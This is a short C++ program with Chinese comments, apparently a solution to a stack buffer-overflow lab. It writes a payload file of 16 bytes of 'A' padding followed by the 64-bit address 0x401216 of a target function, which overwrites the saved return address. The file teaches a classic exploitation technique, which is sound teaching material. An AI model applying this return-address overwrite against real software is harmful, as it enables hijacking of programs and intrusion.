#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint> // 用于 uint64_t

int main() {
    // 1. 定义关键数据
    // 目标函数 func1 的地址: 0x401216
    // 使用 uint64_t 确保它是 8 字节长 (64位系统)
    uint64_t target_addr = 0x401216;
    
    // 2. 准备填充数据
    // 根据之前的计算：缓冲区 8 字节 + saved rbp 8 字节 = 16 字节
    const int padding_size = 16;
    char padding[padding_size];
    for(int i = 0; i < padding_size; i++) {
        padding[i] = 'A'; // 填充什么字符无所谓，只要长度够
    }

    // 3. 打开文件准备写入 (二进制模式)
    std::ofstream outfile("ans1.txt", std::ios::binary);
    
    if (!outfile) {
        std::cerr << "无法创建文件!" << std::endl;
        return 1;
    }

    // 4. 写入数据
    // 先写 16 字节的填充
    outfile.write(padding, padding_size);
    
    // 再写 8 字节的目标地址
    // reinterpret_cast 将整数的内存地址强制转换为字符指针，以便写入原始字节
    
    outfile.write(reinterpret_cast<const char*>(&target_addr), sizeof(target_addr));

    outfile.close();
    
    std::cout << "攻击文件 ans1.txt 已生成!" << std::endl;
    return 0;
}